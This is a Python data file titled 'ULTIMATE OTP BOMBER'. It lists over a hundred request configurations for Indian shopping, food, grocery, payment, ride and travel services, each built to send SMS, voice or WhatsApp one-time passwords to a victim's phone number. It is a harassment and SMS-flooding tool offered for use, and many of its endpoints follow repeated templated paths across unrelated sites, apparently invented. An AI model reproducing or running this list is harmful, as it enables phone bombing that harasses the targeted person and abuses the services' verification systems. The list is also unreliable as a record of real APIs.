# apis1.py
# 🔥 ULTIMATE OTP BOMBER - ALL APIs (JSON FORMAT CONVERTED)

ULTIMATE_APIS = [
    
    # ==============================================================================
    # 🛒 E-COMMERCE APPS
    # ==============================================================================
    
    {"name": "Flipkart SMS", "url": "https://2.rome.api.flipkart.com/api/4/user/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {"name": "Flipkart Voice", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Flipkart WhatsApp", "url": "https://flipkart.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    {"name": "Flipkart OTP", "url": "https://flipkart.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Flipkart Login", "url": "https://flipkart.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Flipkart Resend", "url": "https://flipkart.com/api/v2/otpgenerate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    {"name": "Flipkart Verify", "url": "https://flipkart.com/api/v1/auth/otpsend", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Flipkart Call", "url": "https://flipkart.com/api/v1/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Amazon SMS", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&action=otp"},
    {"name": "Amazon Voice", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&action=voice_otp"},
    {"name": "Amazon WhatsApp", "url": "https://amazon.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Amazon OTP", "url": "https://amazon.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    {"name": "Amazon Call", "url": "https://amazon.in/api/v1/auth/otpsend", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Amazon Pay SMS", "url": "https://pay.amazon.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Amazon Pay Voice", "url": "https://pay.amazon.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {"name": "Amazon Pay WhatsApp", "url": "https://pay.amazon.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Myntra SMS", "url": "https://www.myntra.com/gw/mobile-auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Myntra Voice", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Myntra WhatsApp", "url": "https://myntra.com/api/v1/auth/otpsend", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Ajio SMS", "url": "https://www.ajio.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {"name": "Ajio Call", "url": "https://ajio.com/api/v1/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Ajio WhatsApp", "url": "https://ajio.com/v3/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    
    {"name": "Meesho WhatsApp", "url": "https://meesho.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {"name": "Meesho SMS", "url": "https://meesho.com/api/v1/auth/otpsend", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Meesho Call", "url": "https://meesho.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    
    {"name": "Snapdeal SMS", "url": "https://www.snapdeal.com/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Snapdeal Call", "url": "https://snapdeal.com/api/v2/otpgenerate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Limeroad SMS", "url": "https://www.limeroad.com/api/v1/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Limeroad Call", "url": "https://limeroad.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Shopclues SMS", "url": "https://www.shopclues.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Shopclues Call", "url": "https://shopclues.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Tata Cliq SMS", "url": "https://www.tatacliq.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Tata Cliq Call", "url": "https://tatacliq.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Croma SMS", "url": "https://www.croma.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Croma Call", "url": "https://croma.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    
    {"name": "Reliance Digital SMS", "url": "https://www.reliancedigital.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Reliance Digital Call", "url": "https://reliancedigital.in/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "FirstCry SMS", "url": "https://www.firstcry.com/api/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "FirstCry Call", "url": "https://firstcry.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    # ==============================================================================
    # 💄 BEAUTY / FASHION
    # ==============================================================================
    
    {"name": "Nykaa SMS", "url": "https://www.nykaa.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Nykaa Call", "url": "https://nykaa.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Purplle SMS", "url": "https://www.purplle.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Purplle Call", "url": "https://purplle.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "MamaEarth SMS", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "MamaEarth Call", "url": "https://mamaearth.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Bewakoof SMS", "url": "https://www.bewakoof.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Bewakoof Call", "url": "https://bewakoof.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Souled Store SMS", "url": "https://www.thesouledstore.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Souled Store Call", "url": "https://thesouledstore.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Zivame SMS", "url": "https://www.zivame.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Zivame Call", "url": "https://zivame.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Clovia Call", "url": "https://clovia.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Paytm Mall SMS", "url": "https://paytmmall.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Paytm Mall Call", "url": "https://paytmmall.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    # ==============================================================================
    # 🍔 FOOD DELIVERY
    # ==============================================================================
    
    {"name": "Swiggy SMS", "url": "https://www.swiggy.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Swiggy Voice", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Swiggy WhatsApp", "url": "https://swiggy.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Zomato SMS", "url": "https://www.zomato.com/php/asyncLogin.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}"},
    {"name": "Zomato Voice", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&type=voice"},
    {"name": "Zomato WhatsApp", "url": "https://zomato.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    
    {"name": "Dominos SMS", "url": "https://order.godominos.co.in/Online/App.aspx", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"PhoneNo={phone}"},
    {"name": "Dominos Call", "url": "https://dominos.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Pizza Hut SMS", "url": "https://www.pizzahut.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Pizza Hut Call", "url": "https://pizzahut.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "McDonalds SMS", "url": "https://www.mcdelivery.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "McDonalds Call", "url": "https://mcdelivery.in/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Burger King SMS", "url": "https://www.burgerking.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Burger King Call", "url": "https://burgerking.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "KFC SMS", "url": "https://www.kfc.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "KFC Call", "url": "https://kfc.co.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    # ==============================================================================
    # 🛒 GROCERY
    # ==============================================================================
    
    {"name": "BigBasket SMS", "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"{phone}"}}'},
    {"name": "BigBasket Voice", "url": "https://www.bigbasket.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "BigBasket WhatsApp", "url": "https://bigbasket.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Grofers SMS", "url": "https://www.grofers.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Grofers Call", "url": "https://grofers.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Grofers WhatsApp", "url": "https://grofers.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Zepto SMS", "url": "https://www.zepto.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Zepto Voice", "url": "https://zepto.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Zepto WhatsApp", "url": "https://zepto.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Blinkit SMS", "url": "https://blinkit.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Blinkit Call", "url": "https://blinkit.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Blinkit WhatsApp", "url": "https://blinkit.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Dunzo SMS", "url": "https://www.dunzo.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Dunzo Call", "url": "https://dunzo.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Dunzo WhatsApp", "url": "https://dunzo.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Milkbasket SMS", "url": "https://www.milkbasket.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Milkbasket Call", "url": "https://milkbasket.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Country Delight SMS", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android"}}'},
    {"name": "Country Delight Call", "url": "https://countrydelight.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Licious SMS", "url": "https://www.licious.in/api/login/signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Licious Call", "url": "https://licious.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    
    {"name": "Freshtohome SMS", "url": "https://www.freshtohome.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Freshtohome Call", "url": "https://freshtohome.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Godrej SMS", "url": "https://www.godrejnaturesbasket.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Godrej Call", "url": "https://godrejnaturesbasket.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Spencer SMS", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Spencer Call", "url": "https://spencers.in/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "More Retail SMS", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "More Retail Call", "url": "https://moreretail.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    # ==============================================================================
    # 💰 PAYMENTS / WALLETS
    # ==============================================================================
    
    {"name": "Paytm SMS", "url": "https://accounts.paytm.com/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","loginData":"LOGIN_USING_PHONE"}}'},
    {"name": "Paytm Voice", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Paytm WhatsApp", "url": "https://paytm.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "PhonePe SMS", "url": "https://www.phonepe.com/api/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "PhonePe Voice", "url": "https://phonepe.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "PhonePe WhatsApp", "url": "https://phonepe.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Google Pay SMS", "url": "https://pay.google.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    {"name": "Google Pay Voice", "url": "https://pay.google.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Google Pay WhatsApp", "url": "https://pay.google.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "BHIM SMS", "url": "https://www.bhim.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "BHIM Call", "url": "https://bhim.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    {"name": "BHIM WhatsApp", "url": "https://bhim.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "MobiKwik SMS", "url": "https://www.mobikwik.com/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "MobiKwik Voice", "url": "https://mobikwik.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "MobiKwik WhatsApp", "url": "https://mobikwik.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "FreeCharge SMS", "url": "https://www.freecharge.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "FreeCharge Call", "url": "https://freecharge.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "FreeCharge WhatsApp", "url": "https://freecharge.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Ola Money SMS", "url": "https://www.olamoney.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Ola Money Call", "url": "https://olamoney.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Ola Money WhatsApp", "url": "https://olamoney.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    # ==============================================================================
    # 🚕 CAB / RIDE
    # ==============================================================================
    
    {"name": "Uber SMS", "url": "https://auth.uber.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Uber Voice", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Uber WhatsApp", "url": "https://uber.com/api/v1/auth/otpsend", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    
    {"name": "Ola SMS", "url": "https://api.olacabs.com/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Ola Voice", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Ola WhatsApp", "url": "https://olacabs.com/api/v1/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Rapido SMS", "url": "https://rapido.bike/api/v2/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Rapido Voice", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Rapido WhatsApp", "url": "https://rapido.bike/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Meru Cabs SMS", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobile_number={phone}"},
    {"name": "Meru Cabs Call", "url": "https://merucabapp.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    
    # ==============================================================================
    # ✈️ TRAVEL
    # ==============================================================================
    
    {"name": "MakeMyTrip SMS", "url": "https://www.makemytrip.com/api/umbrella/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "MakeMyTrip Voice", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "MakeMyTrip WhatsApp", "url": "https://makemytrip.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Goibibo SMS", "url": "https://www.goibibo.com/user/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Goibibo Voice", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Goibibo WhatsApp", "url": "https://goibibo.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    
    {"name": "IRCTC SMS", "url": "https://www.irctc.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "IRCTC Call", "url": "https://irctc.co.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "RedBus SMS", "url": "https://www.redbus.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "RedBus Call", "url": "https://redbus.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "RedBus WhatsApp", "url": "https://redbus.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "OYO SMS", "url": "https://api.oyoroomscrm.com/api/v2/user/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "OYO Voice", "url": "https://www.oyorooms.com/api/pwa/generateotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","country_code":"+91"}}'},
    {"name": "OYO WhatsApp", "url": "https://oyorooms.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Treebo SMS", "url": "https://www.treebo.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Treebo Call", "url": "https://treebo.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Cleartrip SMS", "url": "https://www.cleartrip.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Cleartrip Call", "url": "https://cleartrip.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "EaseMyTrip SMS", "url": "https://www.easemytrip.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "EaseMyTrip Call", "url": "https://easemytrip.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
